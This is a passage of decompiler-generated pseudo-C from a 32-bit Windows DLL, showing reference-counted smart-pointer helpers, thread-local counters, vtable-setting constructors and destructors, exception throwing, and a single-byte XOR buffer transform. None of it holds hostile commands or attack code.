  InterlockedIncrement(v14);
  LOBYTE(v19) = 2;
  sub_10025457(a1 + 3, v13, v14);
  v14 = (int *)(*a2)[7];
  v13 = v9;
  v12 = v9;
  sub_10009F32(&v12, a3);
  LOBYTE(v19) = 5;
  v10 = (_DWORD *)a1[14];
  LOBYTE(v19) = 2;
  sub_100220AA(v10, v17, (int)v12, (int)v13, v14);
  LOBYTE(v19) = 2;
  sub_1000DC9E(v17);
  LOBYTE(v19) = 1;
  sub_1000C45D(v15);
  LOBYTE(v19) = 0;
  sub_10012CBF(v16);
  return a2;
}
// 1000D55F: variable 'v7' is possibly undefined
// 1000D599: variable 'v9' is possibly undefined
// 1000D4F2: using guessed type _DWORD var_20[2];
// 1000D4F2: using guessed type int var_34[5];

//----- (1000D5EB) --------------------------------------------------------
_DWORD *__stdcall sub_1000D5EB(int *a1, _DWORD *a2, int a3, int a4, void *Block)
{
  bool v5; // zf
  int **v6; // eax
  _DWORD *v8; // [esp-Ch] [ebp-3Ch]
  volatile LONG *v9; // [esp-8h] [ebp-38h]
  _DWORD v10[2]; // [esp+10h] [ebp-20h] BYREF
  int v11[2]; // [esp+18h] [ebp-18h] BYREF
  int v12; // [esp+20h] [ebp-10h]
  int v13; // [esp+2Ch] [ebp-4h]

  v13 = 0;
  v12 = 0;
  sub_10012C8B(a1, v10);
  v13 = 1;
  sub_1000D692(a1, a2, a3);
  v5 = *a2 == 0;
  v12 = 1;
  if ( v5 )
  {
    v6 = sub_1000D4F2(a1, (int **)v11, a3, a4, Block);
    LOBYTE(v13) = 2;
    sub_1000DB7A(v6, (int)a2);
    LOBYTE(v13) = 1;
    sub_1000DB4C((void **)v11);
  }
  v9 = (volatile LONG *)a2[1];
  v8 = (_DWORD *)*a2;
  InterlockedIncrement(v9);
  LOBYTE(v13) = 1;
  sub_1000CB2C(v8, (int)v9, a4);
  LOBYTE(v13) = 0;
  sub_10012CBF(v10);
  return a2;
}
// 1000D5EB: using guessed type _DWORD var_20[2];

//----- (1000D692) --------------------------------------------------------
_DWORD *__thiscall sub_1000D692(int *this, _DWORD *a2, int a3)
{
  int v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v7; // [esp-10h] [ebp-50h]
  int v8; // [esp-8h] [ebp-48h] BYREF
  int v9; // [esp-4h] [ebp-44h]
  _DWORD v10[2]; // [esp+10h] [ebp-30h] BYREF
  _DWORD v11[2]; // [esp+18h] [ebp-28h] BYREF
  int v12[3]; // [esp+20h] [ebp-20h] BYREF
  int v13; // [esp+2Ch] [ebp-14h]
  int v14; // [esp+3Ch] [ebp-4h]

  v13 = 0;
  sub_10012C8B(this, v11);
  v14 = 1;
  v9 = v4;
  v8 = v4;
  v12[2] = (int)&v8;
  sub_10009F32(&v8, a3);
  LOBYTE(v14) = 2;
  v5 = sub_10021FA0(this[14], v10);
  LOBYTE(v14) = 3;
  v7 = (_DWORD *)*v5;
  LOBYTE(v14) = 4;
  sub_10022475(v7, v12, v8, v9);
  LOBYTE(v14) = 6;
  sub_1000DBA8(v10);
  if ( v12[0] )
    sub_10024E40((int)(this + 3), a2, *(_DWORD *)(v12[0] + 36));
  else
    sub_1000DB0D(a2, 0);
  v13 = 1;
  LOBYTE(v14) = 1;
  sub_1000DC9E(v12);
  LOBYTE(v14) = 0;
  sub_10012CBF(v11);
  return a2;
}
// 1000D6B4: variable 'v4' is possibly undefined
// 1000D692: using guessed type _DWORD var_28[2];
// 1000D692: using guessed type _DWORD var_30[2];

//----- (1000D755) --------------------------------------------------------
void __stdcall sub_1000D755(int *a1, int a2, _DWORD *a3, volatile LONG *lpAddend, int *a5)
{
  _DWORD *v5; // edi
  int v6; // esi
  int v7; // edi
  _DWORD *v8; // [esp-8h] [ebp-2Ch] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-28h]
  _DWORD v10[4]; // [esp+10h] [ebp-14h] BYREF
  int v11; // [esp+20h] [ebp-4h]

  v11 = 0;
  sub_10012C8B(a1, v10);
  LOBYTE(v11) = 1;
  v5 = a3;
  sub_1000C439(a5, (int)(a3 + 1));
  v6 = v5[7];
  a5 = (int *)&v8;
  v9 = lpAddend;
  v8 = v5;
  InterlockedIncrement(lpAddend);
  LOBYTE(v11) = 1;
  sub_10025332(a1 + 3, v8, v9);
  v7 = v5[7];
  if ( v6 != v7 )
    sub_1000D7E2(a1, a2, v7);
  LOBYTE(v11) = 0;
  sub_10012CBF(v10);
  v11 = -1;
  sub_1000DB4C((void **)&a3);
}
// 1000D755: using guessed type _DWORD var_14[4];

//----- (1000D7E2) --------------------------------------------------------
int __thiscall sub_1000D7E2(int *this, int a2, int Src)
{
  int v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v8; // [esp-14h] [ebp-50h]
  int v9; // [esp-Ch] [ebp-48h] BYREF
  int v10; // [esp-8h] [ebp-44h]
  int v11; // [esp-4h] [ebp-40h]
  void *v12; // [esp+10h] [ebp-2Ch]
  _DWORD v13[2]; // [esp+14h] [ebp-28h] BYREF
  _DWORD v14[2]; // [esp+1Ch] [ebp-20h] BYREF
  _DWORD v15[3]; // [esp+24h] [ebp-18h] BYREF
  int v16; // [esp+38h] [ebp-4h]

  sub_10012C8B(this, v15);
  v16 = 0;
  v11 = Src;
  ++this[17];
  v10 = v4;
  v9 = v4;
  v12 = &v9;
  sub_10009F32(&v9, a2);
  LOBYTE(v16) = 1;
  v5 = sub_10021FA0(this[14], v14);
  LOBYTE(v16) = 2;
  v8 = (_DWORD *)*v5;
  LOBYTE(v16) = 3;
  v6 = sub_10022475(v8, v13, v9, v10);
  LOBYTE(v16) = 4;
  sub_1002189D((_DWORD *)*v6, v11);
  LOBYTE(v16) = 3;
  sub_1000DC9E(v13);
  LOBYTE(v16) = 0;
  sub_1000DBA8(v14);
  v16 = -1;
  return sub_10012CBF(v15);
}
// 1000D825: variable 'v4' is possibly undefined
// 1000D7E2: using guessed type _DWORD var_18[3];
// 1000D7E2: using guessed type _DWORD var_20[2];
// 1000D7E2: using guessed type _DWORD var_28[2];

//----- (1000D8A8) --------------------------------------------------------
int *__thiscall sub_1000D8A8(int this, int *a2)
{
  void *v2; // esi

  v2 = (void *)(this + 12);
  sub_10024C3A((void *)(this + 12));
  sub_10021C24(a2, v2);
  return a2;
}

//----- (1000D8E5) --------------------------------------------------------
int __thiscall sub_1000D8E5(int *this, int a2)
{
  int v3; // ecx
  int v4; // esi
  int v6; // [esp-8h] [ebp-34h] BYREF
  int v7; // [esp-4h] [ebp-30h]
  void *v8; // [esp+10h] [ebp-1Ch]
  _DWORD v9[3]; // [esp+14h] [ebp-18h] BYREF
  int v10; // [esp+28h] [ebp-4h]

  sub_10012C8B(this, v9);
  v10 = 0;
  ++this[17];
  v7 = v3;
  v6 = v3;
  v8 = &v6;
  sub_10009F32(&v6, a2);
  LOBYTE(v10) = 1;
  v4 = this[14];
  LOBYTE(v10) = 0;
  sub_1002219E(v4, v6, v7);
  v10 = -1;
  return sub_10012CBF(v9);
}
// 1000D925: variable 'v3' is possibly undefined
// 1000D8E5: using guessed type _DWORD var_18[3];

//----- (1000D968) --------------------------------------------------------
_DWORD *__thiscall sub_1000D968(int *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v7; // [esp-8h] [ebp-44h] BYREF
  _DWORD *v8; // [esp-4h] [ebp-40h]
  _DWORD v9[2]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD v10[2]; // [esp+18h] [ebp-24h] BYREF
  _DWORD *v11[3]; // [esp+20h] [ebp-1Ch] BYREF
  int v12; // [esp+2Ch] [ebp-10h]
  int v13; // [esp+38h] [ebp-4h]

  v12 = 0;
  sub_10012C8B(this, v10);
  v13 = 1;
  sub_10021FA0(this[14], v11);
  LOBYTE(v13) = 2;
  if ( sub_1000A1C0((int)&unk_100955D0, a3) )
  {
    v8 = v4;
    v7 = v4;
    v11[2] = &v7;
    sub_10009F32(&v7, a3);
    LOBYTE(v13) = 2;
    v5 = sub_100223E4(v11[0], v9, (int)v7, (int)v8);
    LOBYTE(v13) = 4;
    sub_1000DBD3(v11, v5);
    LOBYTE(v13) = 2;
    sub_1000DBA8(v9);
  }
  v8 = a2;
  if ( v11[0] )
    sub_10022712(v11[0], (int)v8);
  else
    sub_10006715(v8);
  v12 = 1;
  LOBYTE(v13) = 1;
  sub_1000DBA8(v11);
  LOBYTE(v13) = 0;
  sub_10012CBF(v10);
  return a2;
}
// 1000D9AC: variable 'v4' is possibly undefined
// 1000D968: using guessed type _DWORD var_24[2];
// 1000D968: using guessed type _DWORD var_2C[2];

//----- (1000DA26) --------------------------------------------------------
int __thiscall sub_1000DA26(int this)
{
  int v2; // esi
  _DWORD v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  sub_10012C8B((int *)this, v4);
  v5 = 0;
  v2 = **(_DWORD **)(this + 56);
  v5 = -1;
  sub_10012CBF(v4);
  return v2;
}
// 1000DA26: using guessed type _DWORD var_14[4];

//----- (1000DA5A) --------------------------------------------------------
void __thiscall sub_1000DA5A(int this)
{
  int v2; // eax
  int *v3; // eax
  void *v4[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v5; // [esp+28h] [ebp-4h]

  v4[2] = (void *)this;
  sub_10012B54((int *)(this + 12));
  v5 = 0;
  if ( !*(_DWORD *)(this + 64) )
  {
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)this + 100))(this) )
    {
      v2 = **(_DWORD **)(this + 92);
      if ( !*(_DWORD *)(this + 56) || v2 != *(_DWORD *)(this + 68) )
      {
        *(_DWORD *)(this + 68) = v2;
        v3 = sub_1000D8A8(this, (int *)v4);
        LOBYTE(v5) = 1;
        sub_1000DC70(v3, this + 56);
        LOBYTE(v5) = 0;
        sub_1000DC42(v4);
      }
    }
  }
  v5 = -1;
  ++*(_DWORD *)(this + 64);
}

//----- (1000DAE1) --------------------------------------------------------
int __thiscall sub_1000DAE1(int this)
{
  if ( (*(_DWORD *)(this + 64))-- == 1 )
    **(_DWORD **)(this + 92) = *(_DWORD *)(this + 68);
  return sub_10012B30(this + 12);
}

//----- (1000DB0D) --------------------------------------------------------
_DWORD *__userpurge sub_1000DB0D@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1000DB4C) --------------------------------------------------------
void __stdcall sub_1000DB4C(void **a1)
{
  sub_1000DCE6(a1);
}

//----- (1000DB7A) --------------------------------------------------------
int __usercall sub_1000DB7A@<eax>(_DWORD *a1@<edi>, int a2@<esi>)
{
  volatile LONG *v3; // [esp-4h] [ebp-4h]

  if ( *(_DWORD *)a2 != *a1 )
  {
    sub_1000DCE6((void **)a2);
    *(_DWORD *)(a2 + 4) = a1[1];
    v3 = *(volatile LONG **)(a2 + 4);
    *(_DWORD *)a2 = *a1;
    InterlockedIncrement(v3);
  }
  return a2;
}

//----- (1000DBA8) --------------------------------------------------------
void __thiscall sub_1000DBA8(void *this)
{
  sub_1000DD24((int)this);
}

//----- (1000DBD3) --------------------------------------------------------
_DWORD *__usercall sub_1000DBD3@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_1000DD24((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1000DC03) --------------------------------------------------------
_DWORD *__userpurge sub_1000DC03@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1000DC42) --------------------------------------------------------
void __stdcall sub_1000DC42(void **a1)
{
  sub_1000DD5E(a1);
}

//----- (1000DC70) --------------------------------------------------------
int __usercall sub_1000DC70@<eax>(_DWORD *a1@<edi>, int a2@<esi>)
{
  volatile LONG *v3; // [esp-4h] [ebp-4h]

  if ( *(_DWORD *)a2 != *a1 )
  {
    sub_1000DD5E((void **)a2);
    *(_DWORD *)(a2 + 4) = a1[1];
    v3 = *(volatile LONG **)(a2 + 4);
    *(_DWORD *)a2 = *a1;
    InterlockedIncrement(v3);
  }
  return a2;
}

//----- (1000DC9E) --------------------------------------------------------
void __thiscall sub_1000DC9E(void *this)
{
  sub_1000DD8A((int)this);
}

//----- (1000DCE6) --------------------------------------------------------
void __usercall sub_1000DCE6(void **a1@<eax>)
{
  void *v2; // esi

  if ( !InterlockedDecrement((volatile LONG *)a1[1]) )
  {
    if ( a1[1] )
      j__free(a1[1]);
    v2 = *a1;
    if ( v2 )
      sub_1000DDB2(v2);
  }
}

//----- (1000DD24) --------------------------------------------------------
void __usercall sub_1000DD24(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000DD5E) --------------------------------------------------------
void __usercall sub_1000DD5E(void **a1@<eax>)
{
  void *v2; // esi

  if ( !InterlockedDecrement((volatile LONG *)a1[1]) )
  {
    if ( a1[1] )
      j__free(a1[1]);
    v2 = *a1;
    if ( v2 )
      sub_1000DDCD(v2);
  }
}

//----- (1000DD8A) --------------------------------------------------------
void __usercall sub_1000DD8A(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000DDB2) --------------------------------------------------------
void *__stdcall sub_1000DDB2(void *Block)
{
  sub_1000DDE8((int)Block);
  j__free(Block);
  return Block;
}

//----- (1000DDCD) --------------------------------------------------------
void *__stdcall sub_1000DDCD(void *Block)
{
  sub_1000DE0B((int)Block);
  j__free(Block);
  return Block;
}

//----- (1000DDE8) --------------------------------------------------------
LONG __stdcall sub_1000DDE8(int a1)
{
  return sub_1000C45D((int *)(a1 + 4));
}

//----- (1000DE0B) --------------------------------------------------------
void __stdcall sub_1000DE0B(int a1)
{
  sub_1000DBA8((void *)(a1 + 12));
  sub_1000DB4C((void **)(a1 + 4));
}

//----- (1000DE59) --------------------------------------------------------
LPVOID sub_1000DE59()
{
  DWORD LastError; // edi
  LPVOID Value; // eax
  LPVOID v2; // esi

  LastError = GetLastError();
  Value = TlsGetValue(dwTlsIndex);
  if ( !Value )
    Value = (LPVOID)sub_10025818();
  v2 = Value;
  SetLastError(LastError);
  return v2;
}

//----- (1000DE86) --------------------------------------------------------
void __cdecl sub_1000DE86(LPVOID lpTlsValue)
{
  DWORD LastError; // esi

  LastError = GetLastError();
  if ( !TlsSetValue(dwTlsIndex, lpTlsValue) )
    sub_10025844();
  SetLastError(LastError);
}
// 10025844: using guessed type void __noreturn sub_10025844(void);

//----- (1000DEB4) --------------------------------------------------------
_DWORD *__thiscall sub_1000DEB4(_DWORD *this, int a2)
{
  char *v3; // eax

  *this = &off_10073458;
  v3 = (char *)sub_1000DE59();
  sub_1000DE86(v3 + 1);
  return this;
}
// 10073458: using guessed type int (__thiscall *off_10073458)(void *Block, char);

//----- (1000DED0) --------------------------------------------------------
_DWORD *__thiscall sub_1000DED0(_DWORD *Block, char a2)
{
  sub_1000DF1A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000DEEF) --------------------------------------------------------
_DWORD *__thiscall sub_1000DEEF(_DWORD *this)
{
  DWORD LastError; // edi
  int v3; // eax

  *this = &off_10073458;
  LastError = GetLastError();
  v3 = sub_1000DE59();
  sub_1000DE86((LPVOID)(v3 + 1));
  SetLastError(LastError);
  return this;
}
// 1000DE59: using guessed type int sub_1000DE59(void);
// 10073458: using guessed type int (__thiscall *off_10073458)(void *Block, char);

//----- (1000DF1A) --------------------------------------------------------
void __thiscall sub_1000DF1A(_DWORD *this)
{
  char *v1; // eax

  *this = &off_10073458;
  v1 = (char *)sub_1000DE59();
  sub_1000DE86(v1 - 1);
}
// 10073458: using guessed type int (__thiscall *off_10073458)(void *Block, char);

//----- (1000DF56) --------------------------------------------------------
_DWORD *__stdcall sub_1000DF56(_DWORD *a1)
{
  sub_1000DEEF(a1);
  a1[1] = 0;
  *a1 = &off_10072C00;
  return a1;
}
// 10072C00: using guessed type int (__thiscall *off_10072C00)(void *Block, char);

//----- (1000DF88) --------------------------------------------------------
void __thiscall sub_1000DF88(_DWORD *this)
{
  *this = &off_10072C00;
  sub_1000DF1A(this);
}
// 10072C00: using guessed type int (__thiscall *off_10072C00)(void *Block, char);

//----- (1000DFAC) --------------------------------------------------------
_DWORD *__stdcall sub_1000DFAC(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10073460;
  return a1;
}
// 10073460: using guessed type int (__thiscall *off_10073460)(void *Block, char);

//----- (1000DFDA) --------------------------------------------------------
_DWORD *__thiscall sub_1000DFDA(_DWORD *Block, char a2)
{
  sub_1000DFF9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000DFF9) --------------------------------------------------------
void __thiscall sub_1000DFF9(_DWORD *this)
{
  *this = &off_10073460;
  sub_1000DF1A(this);
}
// 10073460: using guessed type int (__thiscall *off_10073460)(void *Block, char);

//----- (1000E01D) --------------------------------------------------------
_DWORD *__stdcall sub_1000E01D(_DWORD *a1)
{
  *a1 = &unk_10073368;
  sub_1000DEEF(a1 + 1);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10073360;
  return a1;
}
// 10073360: using guessed type int (__stdcall *off_10073360)(char);

//----- (1000E072) --------------------------------------------------------
_DWORD *__stdcall sub_1000E072(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10073468;
  return a1;
}
// 10073468: using guessed type int (__thiscall *off_10073468)(void *Block, char);

//----- (1000E0A0) --------------------------------------------------------
_DWORD *__thiscall sub_1000E0A0(_DWORD *Block, char a2)
{
  sub_1000E0BF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E0BF) --------------------------------------------------------
void __thiscall sub_1000E0BF(_DWORD *this)
{
  *this = &off_10073468;
  sub_1000DF1A(this);
}
// 10073468: using guessed type int (__thiscall *off_10073468)(void *Block, char);

//----- (1000E0E3) --------------------------------------------------------
_DWORD *__stdcall sub_1000E0E3(_DWORD *a1, int a2)
{
  sub_1000DEEF(a1);
  *a1 = &off_10073470;
  a1[1] = a2;
  return a1;
}
// 10073470: using guessed type int (__thiscall *off_10073470)(void *Block, char);

//----- (1000E117) --------------------------------------------------------
_DWORD *__thiscall sub_1000E117(_DWORD *Block, char a2)
{
  sub_1000E136(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E136) --------------------------------------------------------
void __thiscall sub_1000E136(_DWORD *this)
{
  *this = &off_10073470;
  sub_1000DF1A(this);
}
// 10073470: using guessed type int (__thiscall *off_10073470)(void *Block, char);

//----- (1000E15A) --------------------------------------------------------
_DWORD *__stdcall sub_1000E15A(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_1007293C;
  return a1;
}
// 1007293C: using guessed type int (__thiscall *off_1007293C)(void *Block, char);

//----- (1000E188) --------------------------------------------------------
void __thiscall sub_1000E188(_DWORD *this)
{
  *this = &off_1007293C;
  sub_1000DF1A(this);
}
// 1007293C: using guessed type int (__thiscall *off_1007293C)(void *Block, char);

//----- (1000E1AC) --------------------------------------------------------
_DWORD *__stdcall sub_1000E1AC(_DWORD *a1)
{
  *a1 = &unk_10072FC8;
  sub_1000DEEF(a1 + 1);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10072FC0;
  return a1;
}
// 10072FC0: using guessed type int (__stdcall *off_10072FC0)(char);

//----- (1000E201) --------------------------------------------------------
_DWORD *__stdcall sub_1000E201(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10073478;
  return a1;
}
// 10073478: using guessed type int (__thiscall *off_10073478)(void *Block, char);

//----- (1000E22F) --------------------------------------------------------
_DWORD *__thiscall sub_1000E22F(_DWORD *Block, char a2)
{
  sub_1000E24E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E24E) --------------------------------------------------------
void __thiscall sub_1000E24E(_DWORD *this)
{
  *this = &off_10073478;
  sub_1000DF1A(this);
}
// 10073478: using guessed type int (__thiscall *off_10073478)(void *Block, char);

//----- (1000E272) --------------------------------------------------------
_DWORD *__stdcall sub_1000E272(_DWORD *a1, int a2)
{
  sub_1000DEEF(a1);
  *a1 = &off_10073480;
  a1[1] = a2;
  return a1;
}
// 10073480: using guessed type int (__thiscall *off_10073480)(void *Block, char);

//----- (1000E2A6) --------------------------------------------------------
_DWORD *__thiscall sub_1000E2A6(_DWORD *Block, char a2)
{
  sub_1000E2C5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E2C5) --------------------------------------------------------
void __thiscall sub_1000E2C5(_DWORD *this)
{
  sub_1000DF1A(this);
}

//----- (1000E2E3) --------------------------------------------------------
_DWORD *__thiscall sub_1000E2E3(_DWORD *this, int a2)
{
  if ( a2 )
  {
    *this = &unk_100731F8;
    sub_1000DEEF(this + 2);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_100731F0;
  this[1] = GetLastError();
  return this;
}
// 100731F0: using guessed type int (__stdcall *off_100731F0)(char);

//----- (1000E349) --------------------------------------------------------
int __stdcall sub_1000E349(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10073488;
  *(_DWORD *)a1 = &off_100734A0;
  *(_BYTE *)(a1 + 4) = -1;
  return result;
}
// 10073488: using guessed type int (__thiscall *off_10073488)(void *Block, char);
// 100734A0: using guessed type int (__thiscall *off_100734A0)(void *Block, char);

//----- (1000E378) --------------------------------------------------------
_DWORD *__thiscall sub_1000E378(_DWORD *Block, char a2)
{
  sub_1000E3BE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E39E) --------------------------------------------------------
_DWORD *__thiscall sub_1000E39E(_DWORD *Block, char a2)
{
  *Block = &off_10073488;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073488: using guessed type int (__thiscall *off_10073488)(void *Block, char);

//----- (1000E3BE) --------------------------------------------------------
void __thiscall sub_1000E3BE(_DWORD *this)
{
  *this = &off_100734A0;
  *this = &off_10073488;
}
// 10073488: using guessed type int (__thiscall *off_10073488)(void *Block, char);
// 100734A0: using guessed type int (__thiscall *off_100734A0)(void *Block, char);

//----- (1000E3E4) --------------------------------------------------------
_BYTE *__thiscall sub_1000E3E4(_BYTE *this, _DWORD *a2, int pExceptionObject)
{
  _BYTE *result; // eax
  unsigned int v5; // edi
  char v6; // bl
  _BYTE *v8; // [esp+14h] [ebp+8h]

  v8 = (_BYTE *)a2[3];
  result = v8;
  if ( v8 != *(_BYTE **)(pExceptionObject + 12) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v5 = 0;
  if ( v8 )
  {
    do
    {
      v6 = *(_BYTE *)(a2[2] + *(_DWORD *)(a2[1] + 12) + v5) ^ this[4];
      result = (_BYTE *)sub_1000C55B(pExceptionObject, v5++);
      *result = v6;
    }
    while ( v5 < (unsigned int)v8 );
  }
  return result;
}

//----- (1000E44A) --------------------------------------------------------
char sub_1000E44A()
{
  return 1;
}

//----- (1000E44D) --------------------------------------------------------
int __stdcall sub_1000E44D(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_100734B8;
  *(_DWORD *)a1 = &off_100734D0;
  *(_BYTE *)(a1 + 4) = -1;
  return result;
}
// 100734B8: using guessed type int (__thiscall *off_100734B8)(void *Block, char);
// 100734D0: using guessed type int (__thiscall *off_100734D0)(void *Block, char);

//----- (1000E47C) --------------------------------------------------------
_DWORD *__thiscall sub_1000E47C(_DWORD *Block, char a2)
{
  sub_1000E4C2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E4A2) --------------------------------------------------------
_DWORD *__thiscall sub_1000E4A2(_DWORD *Block, char a2)
{
  *Block = &off_100734B8;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100734B8: using guessed type int (__thiscall *off_100734B8)(void *Block, char);

//----- (1000E4C2) --------------------------------------------------------
void __thiscall sub_1000E4C2(_DWORD *this)
{
  *this = &off_100734D0;
  *this = &off_100734B8;
}
// 100734B8: using guessed type int (__thiscall *off_100734B8)(void *Block, char);
// 100734D0: using guessed type int (__thiscall *off_100734D0)(void *Block, char);

//----- (1000E4E8) --------------------------------------------------------
_BYTE *__thiscall sub_1000E4E8(_BYTE *this, _DWORD *a2, int pExceptionObject)
{
  _BYTE *result; // eax
  unsigned int v5; // edi
  char v6; // bl
  _BYTE *v8; // [esp+14h] [ebp+8h]

  v8 = (_BYTE *)a2[3];
  result = v8;
  if ( v8 != *(_BYTE **)(pExceptionObject + 12) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v5 = 0;
  if ( v8 )
  {
    do
    {
      v6 = *(_BYTE *)(a2[2] + *(_DWORD *)(a2[1] + 12) + v5) ^ this[4];
      result = (_BYTE *)sub_1000C55B(pExceptionObject, v5++);
      *result = v6;
    }
    while ( v5 < (unsigned int)v8 );
  }
  return result;
}

//----- (1000E54E) --------------------------------------------------------
char sub_1000E54E()
{
  return 1;
}

//----- (1000E551) --------------------------------------------------------
void __thiscall sub_1000E551(_DWORD *this)
{
  *this = &off_100734E8;
  *this = &off_10073504;
}
// 100734E8: using guessed type int (__thiscall *off_100734E8)(void *Block, char);
// 10073504: using guessed type int (__thiscall *off_10073504)(void *Block, char);

//----- (1000E576) --------------------------------------------------------
_DWORD *__thiscall sub_1000E576(_DWORD *Block, char a2)
{
  sub_1000E551(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E595) --------------------------------------------------------
int sub_1000E595()
{
  return 1;
}

//----- (1000E599) --------------------------------------------------------
_DWORD *__stdcall sub_1000E599(_DWORD *a1, void *a2, void *a3)
{
  _DWORD *v3; // eax
  int v5[7]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  sub_1000E621(a1);
  v6 = 0;
  *a1 = &off_10073520;
  sub_1000C28D(a3, (int)(a1 + 66), a2);
  LOBYTE(v6) = 1;
  v3 = (_DWORD *)sub_1000C28D(0, (int)v5, 0);
  LOBYTE(v6) = 2;
  sub_1000E673(a1, v3);
  LOBYTE(v6) = 1;
  sub_1000C45D(v5);
  return a1;
}
// 10073520: using guessed type int (__thiscall *off_10073520)(void *Block, char);
// 1000E599: using guessed type int var_20[7];

//----- (1000E601) --------------------------------------------------------
_DWORD *__thiscall sub_1000E601(_DWORD *Block, char a2)
{
  sub_10001624(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E621) --------------------------------------------------------
_DWORD *__stdcall sub_1000E621(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &off_10073504;
  *a1 = &off_100734E8;
  return result;
}
// 100734E8: using guessed type int (__thiscall *off_100734E8)(void *Block, char);
// 10073504: using guessed type int (__thiscall *off_10073504)(void *Block, char);

//----- (1000E653) --------------------------------------------------------
_DWORD *__thiscall sub_1000E653(_DWORD *Block, char a2)
{
  *Block = &off_10073504;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073504: using guessed type int (__thiscall *off_10073504)(void *Block, char);

//----- (1000E673) --------------------------------------------------------
LONG __thiscall sub_1000E673(_DWORD *this, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-4h] [ebp-34h]
  int v5[7]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  sub_1000C6CE(this + 66, (int)v5, a2);
  v6 = 0;
  v4 = v5[3];
  v2 = sub_1000C52E(v5);
  sub_10025986(v2, v4);
  v6 = -1;
  return sub_1000C45D(v5);
}

//----- (1000E6C4) --------------------------------------------------------
int __thiscall sub_1000E6C4(void *this, _DWORD *a2, _DWORD *a3)
{
  void *v5; // eax
  int v6; // eax
  int result; // eax
  const void *v8; // [esp-8h] [ebp-14h]
  size_t v9; // [esp-4h] [ebp-10h]
  unsigned int v10; // [esp-4h] [ebp-10h]
  char v11; // [esp+1Bh] [ebp+Fh]

  (*(void (__thiscall **)(void *, _DWORD, _DWORD))(*(_DWORD *)this + 20))(this, a2[3], a3[3]);
  v9 = a2[3];
  v11 = *(_BYTE *)(a3[1] + 8);
  v8 = (const void *)sub_1000C52E(a2);
  v5 = (void *)sub_1000C50A(a3);
  memcpy(v5, v8, v9);
  v10 = a3[3];
  v6 = sub_1000C50A(a3);
  result = sub_100259EE((int)this + 4, v6, v10);
  if ( v11 )
  {
    result = a3[1];
    *(_BYTE *)(result + 8) = 1;
  }
  return result;
}

//----- (1000E72A) --------------------------------------------------------
int sub_1000E72A()
{
  return 0;
}

